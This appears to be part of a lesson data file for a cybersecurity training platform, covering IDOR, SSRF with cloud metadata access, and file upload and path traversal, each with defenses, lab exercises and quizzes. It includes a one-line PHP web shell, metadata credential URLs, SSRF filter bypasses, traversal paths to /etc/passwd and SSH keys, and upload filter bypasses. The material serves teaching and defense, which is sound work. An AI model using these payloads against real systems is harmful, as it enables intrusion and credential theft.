    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'Frontend Engineer']
  },

  'c6_idor': {
    id: 'c6_idor',
    level: 6,
    title: 'Insecure Direct Object References (IDOR & BOLA)',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c5_rest_apis_json', 'c4_burp_proxy'],
    nextConcepts: ['c6_ssrf', 'c8_linux_privesc_methodology'],
    relatedConcepts: ['c5_rest_apis_json'],
    definition: 'An access control vulnerability where an application uses user-supplied input to access database objects directly without verifying if the requesting user is authorized to view or edit that specific record.',
    whyItMatters: 'IDOR / Broken Object Level Authorization is the #1 vulnerability on modern APIs, frequently responsible for massive PII and patient medical record leaks.',
    mentalModel: 'A coat check where the attendant gives you receipt #105. You walk to the counter and say "Give me coat #104", and the attendant hands it to you without checking if #104 belongs to you.',
    coreExplanation: 'When viewing an invoice `GET /api/invoices/1052`, an attacker modifies the parameter to `GET /api/invoices/1053`. If the backend queries `SELECT * FROM invoices WHERE id = 1053` without checking `AND user_id = current_user.id`, private invoices of other tenants are leaked.',
    visualExplanation: {
      type: 'flow',
      title: 'IDOR / Broken Object Level Authorization Flow',
      content: '[User A (Logged in as ID: 50)] -> GET /api/documents/890 -> [Server checks: "Is Doc 890 owned by User 50?"]\n  ├── If NO CHECK: [Server returns User B\'s secret contract] ===> (IDOR VULNERABILITY)\n  └── If PROPER CHECK: [Server returns 403 Forbidden] ===> (SECURE)'
    },
    example: 'Modifying `POST /api/user/delete` with body `{"user_id": 1}` allows a regular user to delete the root administrator account.',
    practicalExercise: {
      task: 'Exploit an IDOR vulnerability in the user profile API to read another user\'s private data in the Web Lab.',
      commandOrPayload: 'curl -s -H "Authorization: Bearer user_token" http://vulnerable-app.lab/api/account/2',
      expectedOutcome: 'Returns profile data and sensitive email addresses belonging to User 2.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Assuming using non-sequential UUIDs (GUIDs) solves IDOR (obscurity is not authorization; UUIDs are still guessable or leaked via logs/APIs).',
      'Checking authentication (`isLoggedIn == true`) while forgetting object-level authorization (`ownsResource(user, resource) == true`).'
    ],
    securityRelevance: 'IDOR bypasses business logic boundaries and breaks multi-tenant data segregation across cloud SaaS platforms.',
    offensivePerspective: 'Pentesters create two test accounts (User A and User B) and systematically replay User A\'s request tokens against User B\'s resource IDs.',
    defensivePerspective: 'Developers implement centralized authorization checks (RBAC/ABAC) at the service/database repository layer for every CRUD operation.',
    assessment: {
      question: 'Why does replacing sequential IDs (1, 2, 3) with random UUIDs fail to fully solve an IDOR vulnerability?',
      options: [
        'Because UUIDs cannot be stored in SQL databases',
        'Because UUIDs only obscure the identifier without enforcing an authorization check to verify if the user actually owns the record',
        'Because UUIDs automatically grant administrator privileges',
        'Because web browsers cannot parse 128-bit strings'
      ],
      correctIndex: 1,
      explanation: 'Security through obscurity is not authorization. If an attacker discovers or guesses a UUID, the backend still lacks the check to verify ownership.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'API Security Specialist']
  },

  'c6_ssrf': {
    id: 'c6_ssrf',
    level: 6,
    title: 'Server-Side Request Forgery (SSRF) & Cloud Metadata Exploitation',
    difficulty: 'ADVANCED',
    prerequisites: ['c5_rest_apis_json', 'c4_burp_proxy'],
    nextConcepts: ['c17_cloud_iam_least_privilege', 'c18_docker_isolation_breakout'],
    relatedConcepts: ['c17_cloud_iam_least_privilege'],
    definition: 'A vulnerability that allows an attacker to coerce a server-side application into making unauthorized HTTP requests to internal, localhost, or cloud metadata endpoints.',
    whyItMatters: 'SSRF in cloud environments (AWS, GCP, Azure) allows attackers to query internal metadata services (`169.254.169.254`) and steal temporary IAM admin credentials.',
    mentalModel: 'A security guard who will run any errand you write on a note: You write "Go to the internal vault in Room 101 and bring back the envelope on the desk", and the guard obeys because he has internal clearance.',
    coreExplanation: 'Occurs when an application accepts a URL from a user (e.g. "Import Avatar from URL" or "Webhooks") and fetches it without restricting destination IP ranges. Attackers supply `http://127.0.0.1:8080/admin` to access local services or `http://169.254.169.254/latest/meta-data/iam/security-credentials/` in AWS.',
    visualExplanation: {
      type: 'flow',
      title: 'Cloud SSRF Metadata Extraction Flow',
      content: '[Attacker] --(Sends URL: http://169.254.169.254/latest/meta-data/)--> [Public Web Server]\n[Public Web Server] --(Fetches internal AWS Metadata IP)--> [AWS Metadata Service :80]\n[Attacker] <-- (Receives IAM Secret Access Keys in Server Response) -- [Public Web Server]'
    },
    example: 'In AWS EC2, fetching `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` returns STS session tokens.',
    practicalExercise: {
      task: 'Exploit SSRF on a webhook URL parameter to query the internal metadata endpoint in the Web Lab.',
      commandOrPayload: 'http://169.254.169.254/computeMetadata/v1/',
      expectedOutcome: 'Extracts internal instance service account tokens and project metadata.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Using naive domain/IP regex blacklists (attackers bypass blacklists using decimal IP `http://2130706433`, hex `0x7f000001`, or DNS rebinding).',
      'Failing to enforce IMDSv2 (session-token-based metadata access) in cloud environments.'
    ],
    securityRelevance: 'SSRF was the primary initial access vector in the famous 2019 Capital One cloud data breach (stealing 100M+ customer records).',
    offensivePerspective: 'Attackers scan internal loopback ports (`127.0.0.1:6379` Redis, `:9200` Elasticsearch) through blind SSRF to achieve internal RCE.',
    defensivePerspective: 'Defenders enforce strict IP destination whitelisting (blocking all RFC 1918 and link-local ranges), require IMDSv2 with token hops = 1, and isolate network egress.',
    assessment: {
      question: 'Which link-local IP address is universally used by AWS, GCP, and Azure to provide instance metadata to running cloud virtual machines?',
      options: ['127.0.0.1', '192.168.1.1', '169.254.169.254', '10.0.0.1'],
      correctIndex: 2,
      explanation: '`169.254.169.254` is the standard link-local address allocated for the Instance Metadata Service (IMDS) across major cloud providers.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Cloud Security Engineer', 'Application Security Engineer', 'Penetration Tester']
  },

  'c6_file_upload_traversal': {
    id: 'c6_file_upload_traversal',
    level: 6,
    title: 'Unrestricted File Upload & Path Traversal',
    difficulty: 'ADVANCED',
    prerequisites: ['c1_linux_fs_perms', 'c5_http_mechanics'],
    nextConcepts: ['c8_linux_privesc_methodology'],
    relatedConcepts: ['c1_linux_fs_perms'],
    definition: 'Flaws allowing attackers to upload executable web shells (e.g. `.php`, `.jsp`, `.aspx`) into web-accessible directories, or traverse directories (`../../`) to overwrite critical system files.',
    whyItMatters: 'Unrestricted file upload is one of the most reliable and direct routes from zero access to full Remote Code Execution (RCE) on web servers.',
    mentalModel: 'A mailroom accepting packages: Instead of sending a paper letter, you send a remote-controlled explosive device, and the mailroom places it directly inside the control room with an execution timer.',
    coreExplanation: 'Path Traversal uses `../` sequences to escape intended folders (e.g. `../../../../etc/passwd`). File Upload flaws occur when the server fails to validate: 1) File extension, 2) MIME type, 3) Magic bytes / file header, 4) Storage directory execution permissions.',
    visualExplanation: {
      type: 'flow',
      title: 'Web Shell Upload & Execution Sequence',
      content: '[Attacker] -> POST /upload (File: shell.php with <?php system($_GET["cmd"]); ?>) -> [Server saves to /var/www/uploads/shell.php]\n[Attacker] -> GET /uploads/shell.php?cmd=id -> [Apache executes PHP engine] -> [Attacker receives: uid=33(www-data) gid=33]'
    },
    example: 'Uploading a file named `../../../root/.ssh/authorized_keys` allows an attacker with write permissions to inject their own SSH public key.',
    practicalExercise: {
      task: 'Upload a sanitized test web shell to verify remote execution in the Web Security Lab.',
      commandOrPayload: '<?php echo "LAB_EXECUTION_SUCCESS: " . php_uname(); ?>',
      expectedOutcome: 'Executes PHP snippet and prints kernel release and hostname information.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Relying solely on client-side MIME-type checks (`Content-Type: image/jpeg`), which attackers trivially forge in Burp Suite.',
      'Allowing script execution in upload directories (uploads should always reside on isolated object storage like AWS S3 or have execution disabled via web server config).'
    ],
    securityRelevance: 'Web shells provide interactive command execution and serve as the initial beachhead for internal network privilege escalation.',
    offensivePerspective: 'Attackers bypass weak extension filters using double extensions (`shell.php.jpg`), null-byte injection (`shell.php%00.png`), or alternative extensions (`.phtml`, `.php5`).',
    defensivePerspective: 'Defenders store uploads outside the web root, re-encode images through graphics libraries to strip metadata payloads, and randomize stored file names.',
    assessment: {
      question: 'Which of the following is the most robust defense against web shell execution via file uploads?',
      options: [
        'Checking if the filename ends with .jpg in client-side JavaScript',
        'Storing user uploads on an isolated object storage service (e.g. AWS S3) or a directory with execution permissions completely disabled',
        'Renaming the file to lowercase',
        'Increasing maximum upload file size limits to 50MB'
      ],
      correctIndex: 1,
      explanation: 'Storing uploaded files outside the web execution path or on object storage prevents the web server daemon from executing uploaded scripts as server-side code.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'DevSecOps Engineer']
  }
};
